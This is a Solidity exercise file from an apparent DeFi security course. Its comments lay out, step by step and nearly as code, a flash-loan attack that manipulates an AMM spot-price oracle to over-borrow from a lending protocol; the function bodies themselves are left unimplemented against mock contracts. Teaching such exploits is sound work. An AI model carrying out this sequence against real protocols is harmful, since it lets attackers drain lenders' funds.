// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {MockPair} from "./MockPair.sol";
import {MockFlashLender, IFlashBorrower} from "./MockFlashLender.sol";
import {SpotPriceLending} from "./SpotPriceLending.sol";

// ============================================================================
//  EXERCISE: OracleAttack — Exploit Spot-Price Oracle Manipulation
// ============================================================================
//
//  A lending protocol values collateral using an AMM's spot price
//  (reserveB / reserveA). Spot price is just the reserve ratio —
//  trivially manipulable with enough capital. Flash loans provide
//  unlimited capital for free.
//
//  The attack:
//    1. Flash-borrow tokenB (free capital)
//    2. Swap tokenB → tokenA on the AMM (inflates spot price)
//    3. Deposit some tokenA as collateral (valued at inflated price)
//    4. Borrow tokenB (more than collateral is actually worth)
//    5. Swap remaining tokenA → tokenB (partially restore price)
//    6. Repay flash loan, keep the profit
//
//  Run:
//    forge test --match-contract OracleManipulationTest -vvv
//
// ============================================================================

/// @notice Attack contract that exploits spot-price oracle manipulation.
/// @dev Exercise for Module 8: DeFi Security (Oracle Manipulation).
///      Students implement: attack() + onFlashLoan().
///      Pre-built: constructor, state variables.
contract OracleAttack is IFlashBorrower {
    using SafeERC20 for IERC20;

    MockPair public immutable pair;
    SpotPriceLending public immutable lending;
    MockFlashLender public immutable flashLender;
    IERC20 public immutable tokenA;
    IERC20 public immutable tokenB;

    /// @notice How much tokenA to deposit as collateral during the attack.
    uint256 public collateralAmount;

    constructor(
        MockPair pair_,
        SpotPriceLending lending_,
        MockFlashLender flashLender_,
        IERC20 tokenA_,
        IERC20 tokenB_
    ) {
        pair = pair_;
        lending = lending_;
        flashLender = flashLender_;
        tokenA = tokenA_;
        tokenB = tokenB_;
    }

    // =============================================================
    //  TODO 1: Implement attack — initiate the flash loan
    // =============================================================
    /// @notice Entry point: request a flash loan to fund the attack.
    /// @dev The flash lender will send tokens then call onFlashLoan().
    ///
    ///   Steps:
    ///     1. Store the collateral amount for use in onFlashLoan():
    ///        collateralAmount = collateral_
    ///
    ///     2. Request a flash loan of tokenB:
    ///        flashLender.flashLoan(address(tokenB), flashAmount)
    ///
    /// See: Module 8 — "Flash Loan Attack P&L Walkthrough"
    ///
    /// @param flashAmount Amount of tokenB to flash-borrow.
    /// @param collateral_ Amount of tokenA to use as collateral.
    function attack(uint256 flashAmount, uint256 collateral_) external {
        revert("Not implemented");
    }

    // =============================================================
    //  TODO 2: Implement onFlashLoan — the full exploit sequence
    // =============================================================
    /// @notice Called by the flash lender after sending tokens.
    /// @dev At this point, this contract holds `amount` of tokenB.
    ///      Execute the full attack sequence:
    ///
    ///   Step 1 — Swap tokenB → tokenA on the AMM (inflates spot price):
    ///     tokenB.approve(address(pair), amount);
    ///     uint256 receivedA = pair.swap(address(tokenB), amount);
    ///
    ///   Step 2 — Deposit tokenA as collateral into SpotPriceLending:
    ///     tokenA.approve(address(lending), collateralAmount);
    ///     lending.depositCollateral(collateralAmount);
    ///
    ///   Step 3 — Borrow max tokenB at the inflated spot price:
    ///     uint256 price = pair.getSpotPrice();
    ///     uint256 collateralValue = collateralAmount * price / 1e18;
    ///     uint256 maxBorrow = collateralValue * 1e18 / lending.COLLATERAL_RATIO();
    ///     lending.borrow(maxBorrow);
    ///
    ///   Step 4 — Swap remaining tokenA → tokenB:
    ///     uint256 remainingA = tokenA.balanceOf(address(this));
    ///     tokenA.approve(address(pair), remainingA);
    ///     pair.swap(address(tokenA), remainingA);
    ///
    ///   Step 5 — Repay the flash loan:
    ///     tokenB.safeTransfer(address(flashLender), amount);
    ///
    ///   After repayment, this contract keeps the profit (1,500 tokenB
    ///   in the exercise scenario).
    ///
    /// See: Module 8 — "Flash Loan Attack P&L Walkthrough"
    ///
    /// @param token The token that was flash-borrowed (tokenB).
    /// @param amount The amount that was flash-borrowed (must be repaid).
    function onFlashLoan(address token, uint256 amount) external override {
        revert("Not implemented");
    }
}
